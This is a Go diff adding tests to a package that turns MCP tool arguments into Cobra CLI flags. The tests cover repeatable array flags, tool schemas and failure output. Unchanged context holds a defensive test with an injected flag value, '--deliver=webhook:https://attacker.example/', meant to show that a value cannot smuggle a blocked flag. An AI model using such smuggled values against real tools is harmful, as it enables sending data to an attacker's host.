@@ -7,6 +7,7 @@ package cobratree
 import (
 	"context"
 	"encoding/json"
+	"errors"
 	"os"
 	"os/exec"
 	"path/filepath"
@@ -160,7 +161,7 @@ func TestCliArgsFromMCP_AllowsPerCommandFlags(t *testing.T) {
 		"tags":    []any{"a", "b"},
 	}
 	got := cliArgsFromMCP(in, map[string]bool{"args": true})
-	want := []string{"--limit=25", "--query=alpha", "--tags=a,b", "--verbose"}
+	want := []string{"--limit=25", "--query=alpha", "--tags=a", "--tags=b", "--verbose"}
 	if !reflect.DeepEqual(got, want) {
 		t.Fatalf("cliArgsFromMCP per-command passthrough: got %v, want %v", got, want)
 	}
@@ -171,6 +172,102 @@ func TestCliArgsFromMCP_AllowsPerCommandFlags(t *testing.T) {
 // token, so emitting `--json` and a value that starts with `--` as two
 // argv elements lets pflag parse the value as a second flag the key-only
 // blocklist never inspected.
+func TestCliArgsFromMCP_RepeatableArrayExpandsToFlagOccurrences(t *testing.T) {
+	got := cliArgsFromMCP(map[string]any{
+		"format": "json",
+		"param":  []any{"a=1", "b=2"},
+		"tag":    []any{"red", "a=1,b=2", nil, ""},
+	}, map[string]bool{"args": true})
+	want := []string{"--format=json", "--param=a=1", "--param=b=2", "--tag=red", "--tag=a=1,b=2", "--tag="}
+	if !reflect.DeepEqual(got, want) {
+		t.Fatalf("repeatable argv = %#v, want %#v", got, want)
+	}
+}
+
+func TestStringArrayEmptyItemReachesCobra(t *testing.T) {
+	got := cliArgsFromMCP(map[string]any{"tag": []any{"red", ""}}, nil)
+	want := []string{"--tag=red", "--tag="}
+	if !reflect.DeepEqual(got, want) {
+		t.Fatalf("argv = %#v, want %#v", got, want)
+	}
+	if tags := parseStringArrayFlags(t, got, []string{"kept"}); !reflect.DeepEqual(tags, []string{"red", ""}) {
+		t.Fatalf("cobra stringArray = %#v, want red and empty", tags)
+	}
+
+	onlyEmpty := cliArgsFromMCP(map[string]any{"tag": []any{""}}, nil)
+	if !reflect.DeepEqual(onlyEmpty, []string{"--tag="}) {
+		t.Fatalf("empty-only argv = %#v, want [--tag=]", onlyEmpty)
+	}
+	if tags := parseStringArrayFlags(t, onlyEmpty, []string{"kept"}); !reflect.DeepEqual(tags, []string{""}) {
+		t.Fatalf("cobra stringArray = %#v, want the empty item in place of the default", tags)
+	}
+	if tags := parseStringArrayFlags(t, nil, []string{"kept"}); !reflect.DeepEqual(tags, []string{"kept"}) {
+		t.Fatalf("default without flags = %#v", tags)
+	}
+}
+
+func parseStringArrayFlags(t *testing.T, args []string, defaults []string) []string {
+	t.Helper()
+	tags := append([]string(nil), defaults...)
+	cmd := &cobra.Command{Use: "label", SilenceErrors: true, SilenceUsage: true}
+	cmd.Flags().StringArrayVar(&tags, "tag", append([]string(nil), defaults...), "")
+	if err := cmd.ParseFlags(args); err != nil {
+		t.Fatalf("ParseFlags(%#v): %v", args, err)
+	}
+	return tags
+}
+
+func TestStringArrayAndSliceFlagsUseArraySchema(t *testing.T) {
+	var params []string
+	var tags []string
+	var format string
+	var timeout time.Duration
+	cmd := &cobra.Command{Use: "sync"}
+	cmd.Flags().StringArrayVar(&params, "param", nil, "repeatable key=value")
+	cmd.Flags().StringSliceVar(&tags, "tag", nil, "repeatable tag")
+	cmd.Flags().StringVar(&format, "format", "", "scalar format")
+	cmd.Flags().DurationVar(&timeout, "timeout", 0, "scalar duration")
+
+	tool := mcplib.NewTool("sync", toolOptionsForFlags(cmd, map[string]bool{}, nil)...)
+	assertArrayOfStrings(t, tool, "param")
+	assertArrayOfStrings(t, tool, "tag")
+	assertStringSchema(t, tool, "format")
+	assertStringSchema(t, tool, "timeout")
+}
+
+func assertArrayOfStrings(t *testing.T, tool mcplib.Tool, name string) {
+	t.Helper()
+	schema := propertySchema(t, tool, name)
+	if schema["type"] != "array" {
+		t.Fatalf("property %q type = %#v, want array", name, schema["type"])
+	}
+	items, ok := schema["items"].(map[string]any)
+	if !ok || items["type"] != "string" {
+		t.Fatalf("property %q items = %#v, want string items", name, schema["items"])
+	}
+}
+
+func assertStringSchema(t *testing.T, tool mcplib.Tool, name string) {
+	t.Helper()
+	schema := propertySchema(t, tool, name)
+	if schema["type"] != "string" {
+		t.Fatalf("property %q type = %#v, want string", name, schema["type"])
+	}
+}
+
+func propertySchema(t *testing.T, tool mcplib.Tool, name string) map[string]any {
+	t.Helper()
+	raw, ok := tool.InputSchema.Properties[name]
+	if !ok {
+		t.Fatalf("property %q missing: %#v", name, tool.InputSchema.Properties)
+	}
+	schema, ok := raw.(map[string]any)
+	if !ok {
+		t.Fatalf("property %q schema = %T", name, raw)
+	}
+	return schema
+}
+
 func TestCliArgsFromMCP_ValueCannotSmuggleBlockedFlag(t *testing.T) {
 	payload := "--deliver=webhook:https://attacker.example/"
 	blocked := map[string]bool{
@@ -1712,6 +1809,209 @@ func TestRunCLICommandFiltersSuccessStderrHints(t *testing.T) {
 	}
 }
 
+func TestShellOutRepeatableStringArrayReachesCLI(t *testing.T) {
+	bin := writeArgvHelper(t)
+	handler := shellOutToCLI(
+		func() (string, error) { return bin, nil },
+		[]string{"sync"},
+		map[string]bool{"args": true},
+		map[string]bool{"param": true, "format": true},
+		nil,
+		false,
+		nil,
+	)
+	result, err := handler(context.Background(), mcplib.CallToolRequest{Params: mcplib.CallToolParams{
+		Arguments: map[string]any{
+			"param":  []any{"a=1", "b=2"},
+			"format": "json",
+		},
+	}})
+	if err != nil {
+		t.Fatalf("handler returned transport error: %v", err)
+	}
+	if result.IsError {
+		t.Fatalf("handler error: %s", toolResultText(result))
+	}
+	got := decodeArgvResult(t, result)
+	want := []string{"sync", "--format=json", "--param=a=1", "--param=b=2"}
+	if !reflect.DeepEqual(got, want) {
+		t.Fatalf("cli argv = %#v, want %#v", got, want)
+	}
+}
+
+func TestShellOutNonZeroExitSurfacesStdoutAndStderr(t *testing.T) {
+	bin := writeShelloutHelper(t, "fail-both")
+	handler := shellOutToCLI(
+		func() (string, error) { return bin, nil },
+		nil,
+		map[string]bool{},
+		map[string]bool{},
+		nil,
+		false,
+		nil,
+	)
+
+	result, err := handler(context.Background(), mcplib.CallToolRequest{})
+	if err != nil {
+		t.Fatalf("handler returned transport error: %v", err)
+	}
+	if !result.IsError {
+		t.Fatalf("handler returned success: %s", toolResultText(result))
+	}
+	stdout := toolResultText(result)
+	var payload map[string]any
+	if err := json.Unmarshal([]byte(stdout), &payload); err != nil {
+		t.Fatalf("stdout content is not the JSON envelope: %v; text=%q", err, stdout)
+	}
+	if payload["error"] != "nope" || payload["code"] != float64(3) {
+		t.Fatalf("stdout envelope = %#v", payload)
+	}
+	stderr := toolResultContentText(result, 1)
+	if !strings.Contains(stderr, "Error: nope") {
+		t.Fatalf("stderr content = %q, want Cobra error line", stderr)
+	}
+	if strings.Contains(stdout, "Error: nope") {
+		t.Fatalf("stdout content mixed in stderr: %q", stdout)
+	}
+}
+
+func TestToolResultFromCLIFailureUsesCauseWhenSilent(t *testing.T) {
+	cause := errors.New("cli /bin/tool: permission denied")
+	result := ToolResultFromCLIFailure(CLICommandResult{}, cause)
+	if result == nil || !result.IsError {
+		t.Fatal("expected tool error")
+	}
+	if got := toolResultText(result); got != cause.Error() {
+		t.Fatalf("text = %q, want %q", got, cause.Error())
+	}
+	if len(result.Content) != 1 {
+		t.Fatalf("content blocks = %d, want 1", len(result.Content))
+	}
+
+	blank := ToolResultFromCLIFailure(CLICommandResult{Stdout: " \n", Stderr: "\t"}, cause)
+	if got := toolResultText(blank); got != cause.Error() {
+		t.Fatalf("blank streams text = %q, want the exec error", got)
+	}
+
+	stderrOnly := ToolResultFromCLIFailure(CLICommandResult{Stderr: "Error: nope"}, cause)
+	if got := toolResultText(stderrOnly); got != "Error: nope" {
+		t.Fatalf("stderr-only text = %q, want stderr", got)
+	}
+
+	emptyCause := ToolResultFromCLIFailure(CLICommandResult{}, nil)
+	if got := toolResultText(emptyCause); got != "command failed" {
+		t.Fatalf("nil cause text = %q", got)
+	}
+}
+
+func TestToolResultFromCLIFailureKeepsStdoutFirst(t *testing.T) {
+	cause := errors.New("exit status 3")
+	result := ToolResultFromCLIFailure(CLICommandResult{
+		Stdout: `{"error":"nope","code":3}`,
+		Stderr: "Error: nope",
+	}, cause)
+	if got := toolResultText(result); got != `{"error":"nope","code":3}` {
+		t.Fatalf("first = %q, want stdout", got)
+	}
+	if got := toolResultContentText(result, 1); got != "Error: nope" {
+		t.Fatalf("stderr block = %q", got)
+	}
+	if strings.Contains(toolResultText(result), "exit status") {
+		t.Fatal("exec error replaced stdout")
+	}
+
+	stdoutOnly := ToolResultFromCLIFailure(CLICommandResult{Stdout: "stdout failure"}, cause)
+	if got := toolResultText(stdoutOnly); got != "stdout failure" {
+		t.Fatalf("stdout-only text = %q", got)
+	}
+	if toolResultContentText(stdoutOnly, 1) != "" {
+		t.Fatal("exec error leaked into a second block")
+	}
+}
+
+func TestShellOutSilentFailureSurfacesExecError(t *testing.T) {
+	t.Run("silent exit", func(t *testing.T) {
+		bin := writeShelloutHelper(t, "fail-silent")
+		text := shellOutFailureText(t, bin, context.Background())
+		if !strings.Contains(text, "exit status 9") {
+			t.Fatalf("text = %q, want exit status 9", text)
+		}
+	})
+	t.Run("permission", func(t *testing.T) {
+		dir := t.TempDir()
+		cause := directoryStartError(t, dir)
+		text := shellOutFailureText(t, dir, context.Background())
+		if !strings.Contains(text, cause) {
+			t.Fatalf("text = %q, want exec error %q", text, cause)
+		}
+	})
+	t.Run("canceled", func(t *testing.T) {
+		bin := writeShelloutHelper(t, "success")
+		ctx, cancel := context.WithCancel(context.Background())
+		cancel()
+		text := shellOutFailureText(t, bin, ctx)
+		if !strings.Contains(text, "context canceled") {
+			t.Fatalf("text = %q, want context canceled", text)
+		}
+	})
+}
+
+// directoryStartError is the OS error from starting a directory. The tool
+// result must keep that text; Unix and Windows phrase it differently.
+func directoryStartError(t *testing.T, dir string) string {
+	t.Helper()
+	err := exec.CommandContext(context.Background(), dir).Run()
+	if err == nil {
+		t.Fatalf("starting %s succeeded", dir)
+	}
+	msg := err.Error()
+	if strings.TrimSpace(msg) == "" {
+		t.Fatalf("starting %s returned an empty error", dir)
+	}
+	return msg
+}
+
+func shellOutFailureText(t *testing.T, bin string, ctx context.Context) string {
+	t.Helper()
+	handler := shellOutToCLI(
+		func() (string, error) { return bin, nil },
+		nil,
+		map[string]bool{},
+		map[string]bool{},
+		nil,
+		false,
+		nil,
+	)
+	result, err := handler(ctx, mcplib.CallToolRequest{})
+	if err != nil {
+		t.Fatalf("handler returned transport error: %v", err)
+	}
+	if result == nil || !result.IsError {
+		t.Fatalf("handler returned success: %s", toolResultText(result))
+	}
+	return toolResultText(result)
+}
+
+func TestRunCLICommandFailureKeepsStdoutBesideStderr(t *testing.T) {
+	bin := writeShelloutHelper(t, "fail-both")
+	got, err := RunCLICommand(context.Background(), bin, nil)
+	if err == nil {
+		t.Fatal("RunCLICommand fail-both succeeded unexpectedly")
+	}
+	if !strings.Contains(got.Stdout, `"code":3`) {
+		t.Fatalf("stdout = %q, want JSON envelope", got.Stdout)
+	}
+	if !strings.Contains(got.Stderr, "Error: nope") {
+		t.Fatalf("stderr = %q, want Cobra error line", got.Stderr)
+	}
+	if !strings.Contains(err.Error(), `"code":3`) || !strings.Contains(err.Error(), "Error: nope") {
+		t.Fatalf("error dropped a stream: %v", err)
+	}
+	if !strings.Contains(err.Error(), "stdout:") || !strings.Contains(err.Error(), "stderr:") {
+		t.Fatalf("error did not label both streams: %v", err)
+	}
+}
+
 func TestRunCLICommandReportsStderrOnFailure(t *testing.T) {
 	bin := writeShelloutHelper(t, "fail-stderr")
 	_, err := RunCLICommand(context.Background(), bin, nil)
@@ -1773,6 +2073,10 @@ func writeShelloutHelper(t *testing.T, mode string) string {
 			body = "@echo off\r\necho boom from stderr 1>&2\r\nexit /b 7\r\n"
 		case "fail-stdout":
 			body = "@echo off\r\necho stdout failure\r\nexit /b 7\r\n"
+		case "fail-both":
+			body = "@echo off\r\necho Error: nope 1>&2\r\necho {\"error\":\"nope\",\"code\":3}\r\nexit /b 3\r\n"
+		case "fail-silent":
+			body = "@echo off\r\nexit /b 9\r\n"
 		case "fail-large-stderr":
 			body = "@echo off\r\npowershell -NoProfile -Command \"[Console]::Error.Write((New-Object string([char]0x78,70000)))\"\r\nexit /b 7\r\n"
 		case "fail-large-stdout":
@@ -1796,6 +2100,10 @@ func writeShelloutHelper(t *testing.T, mode string) string {
 		body = "#!/bin/sh\necho boom from stderr >&2\nexit 7\n"
 	case "fail-stdout":
 		body = "#!/bin/sh\necho stdout failure\nexit 7\n"
+	case "fail-both":
+		body = "#!/bin/sh\necho 'Error: nope' >&2\nprintf '%s\\n' '{\"error\":\"nope\",\"code\":3}'\nexit 3\n"
+	case "fail-silent":
+		body = "#!/bin/sh\nexit 9\n"
 	case "fail-large-stderr":
 		body = "#!/bin/sh\nhead -c 70000 /dev/zero | tr '\\000' x >&2\nexit 7\n"
 	case "fail-large-stdout":
